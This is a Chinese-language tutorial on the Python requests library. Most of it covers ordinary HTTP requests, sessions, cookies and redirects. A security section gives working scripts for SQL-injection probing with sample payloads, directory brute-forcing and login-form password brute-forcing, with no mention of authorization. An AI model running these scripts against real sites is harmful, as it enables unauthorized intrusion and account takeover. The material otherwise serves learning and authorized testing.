# requests 库

> Python 最流行的 HTTP 客户端库，用于发送 HTTP/HTTPS 请求。

---

## 一、安装与导入

```bash
pip install requests
```

```python
import requests
```

---

## 二、常用方法

### 2.1 GET 请求

```python
# 基本 GET 请求
response = requests.get('https://api.example.com/users')

# 带参数的 GET
params = {'page': 1, 'limit': 10}
response = requests.get('https://api.example.com/users', params=params)

# 自定义请求头
headers = {
    'User-Agent': 'MyApp/1.0',
    'Authorization': 'Bearer token123',
    'Accept': 'application/json'
}
response = requests.get(url, headers=headers)

# 超时设置（秒）
response = requests.get(url, timeout=5)

# 禁用 SSL 证书验证（不推荐，仅测试用）
response = requests.get(url, verify=False)

# 代理设置
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
response = requests.get(url, proxies=proxies)
```

### 2.2 POST 请求

```python
# 表单数据
data = {'username': 'admin', 'password': '123456'}
response = requests.post('https://api.example.com/login', data=data)

# JSON 数据
import json
payload = {'name': 'test', 'value': 100}
response = requests.post(url, json=payload)

# 上传文件
files = {
    'file': open('report.pdf', 'rb')
}
response = requests.post(url, files=files)

# 带文件名和类型
files = {
    'file': ('photo.jpg', open('photo.jpg', 'rb'), 'image/jpeg')
}
response = requests.post(url, files=files)
```

### 2.3 其他 HTTP 方法

```python
# PUT
response = requests.put(url, json={'key': 'value'})

# PATCH
response = requests.patch(url, json={'key': 'value'})

# DELETE
response = requests.delete(url)

# HEAD
response = requests.head(url)

# OPTIONS
response = requests.options(url)
```

### 2.4 Response 对象

```python
response = requests.get(url)

# 状态码
print(response.status_code)       # 200
print(response.ok)                # True (200-399)
print(response.raise_for_status()) # 抛出异常如果 4xx/5xx

# 响应头
print(response.headers)
print(response.headers['Content-Type'])
print(response.headers.get('X-Custom'))

# 响应内容
print(response.text)              # 文本
print(response.content)           # 字节
print(response.json())            # JSON 解析为字典/列表
print(response.encoding)          # 编码方式

# 原始响应
print(response.raw.read(100))

# 请求信息
print(response.url)               # 最终 URL
print(response.request.url)       # 请求 URL
print(response.request.headers)   # 请求头

# Cookie
print(response.cookies)
print(response.cookies.get('session'))
```

### 2.5 Cookie 与会话

```python
# 基本 cookie 发送
cookies = {'session': 'abc123', 'token': 'xyz789'}
response = requests.get(url, cookies=cookies)

# Session 对象（保持会话）
session = requests.Session()

# 设置会话级别的 header
session.headers.update({'Authorization': 'Bearer token'})

# 登录后 session 自动保存 cookie
session.post('https://example.com/login', data={'user': 'admin', 'pass': '123'})

# 后续请求自动携带 cookie
response = session.get('https://example.com/dashboard')

# 保存和加载 cookie
import pickle
with open('cookies.pkl', 'wb') as f:
    pickle.dump(session.cookies, f)

with open('cookies.pkl', 'rb') as f:
    session.cookies.update(pickle.load(f))
```

### 2.6 重定向与历史

```python
# 自动跟随重定向（默认 True）
response = requests.get(url, allow_redirects=True)

# 禁止重定向
response = requests.get(url, allow_redirects=False)
print(response.status_code)   # 302
print(response.headers['Location'])

# 重定向历史
response = requests.get(url)
print(response.history)       # [Response [301], Response [302]]
for r in response.history:
    print(r.status_code, r.url)
```

---

## 三、安全相关使用案例

### 3.1 SQL 注入探测

```python
import requests

def sqli_test(url, param, payloads):
    """测试参数是否存在 SQL 注入"""
    for payload in payloads:
        params = {param: payload}
        try:
            response = requests.get(url, params=params, timeout=5)
            
            # 检查错误信息
            errors = ['MySQL syntax', 'SQL syntax', 'ORA-', 'PostgreSQL', 'Warning: mysql_']
            for error in errors:
                if error.lower() in response.text.lower():
                    print(f"[+] 可能存在 SQL 注入: {param} = {payload}")
                    print(f"    错误信息: {error}")
                    return True
        except requests.RequestException as e:
            print(f"[!] 请求错误: {e}")
    
    return False

# 使用示例
url = 'http://example.com/page'
payloads = ["'", "' OR '1'='1", "' UNION SELECT 1,2,3--", "1' AND SLEEP(3)--"]
sqli_test(url, 'id', payloads)
```

### 3.2 目录爆破

```python
import requests
import sys

def dir_brute(base_url, wordlist, ext=''):
    """目录/文件爆破"""
    found = []
    
    with open(wordlist, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]
    
    for path in paths:
        test_url = f"{base_url}/{path}{ext}"
        try:
            response = requests.get(test_url, timeout=3, allow_redirects=False)
            
            if response.status_code != 404:
                print(f"[{response.status_code}] {test_url} - {len(response.content)} bytes")
                found.append((response.status_code, test_url))
                
        except requests.RequestException:
            continue
    
    return found

# 使用示例
dir_brute('http://example.com', 'wordlist.txt', '.php')
```

### 3.3 表单暴力破解

```python
import requests
from bs4 import BeautifulSoup

def form_bruteforce(url, username_field, password_field, username, wordlist):
    """表单登录暴力破解"""
    
    with open(wordlist, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        data = {
            username_field: username,
            password_field: pwd
        }
        
        try:
            response = requests.post(url, data=data, timeout=5, allow_redirects=False)
            
            # 根据状态码或响应内容判断成功
            if response.status_code == 302 or 'Login successful' in response.text:
                print(f"[+] 找到密码: {pwd}")
                return pwd
            else:
                print(f"[-] 失败: {pwd}")
                
        except requests.RequestException as e:
            print(f"[!] 错误: {e}")
    
    return None
```

---

## 四、注意事项

| 事项 | 说明 |
|------|------|
| SSL 验证 | 默认开启，`verify=False` 会有警告 |
| 超时 | 务必设置 timeout，防止无限等待 |
| 重试 | 请求失败时建议使用 `requests.adapters.HTTPAdapter` 实现重试 |
| 编码 | `.text` 会自动检测编码，`.content` 返回原始字节 |
| 大文件下载 | 使用 `stream=True` + `iter_content()` |
| 连接池 | Session 对象自动复用连接，效率更高 |
